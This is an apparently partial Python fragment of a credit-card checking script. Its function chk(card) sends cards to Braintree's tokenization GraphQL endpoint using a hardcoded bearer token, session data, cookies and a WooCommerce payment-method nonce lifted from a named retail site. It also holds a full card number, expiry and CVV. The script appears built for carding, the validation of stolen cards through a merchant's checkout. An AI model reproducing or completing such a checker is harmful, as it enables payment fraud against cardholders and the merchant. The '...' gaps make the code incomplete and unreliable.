def chk(card):
    ...
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0..PdTER5NVJ52ULlopOqQhnfNQy4s6V2YFsqa6q-9YDwvGtEY-pEzomnF-TUBrZFVY2TuFxtRqkmW8D5GBB3tvug',
    ...
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '90f6e61f-64f7-495f-8914-43905483fb5f',
    },
...
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"90f6e61f-64f7-495f-8914-43905483fb5f"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
    ...
    'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_3S1SBY244N': 'GS1.1.1720027471.2.1.1720027542.0.0.0',
}
    ...
    'woocommerce-add-payment-method-nonce': '13f30f13e5',
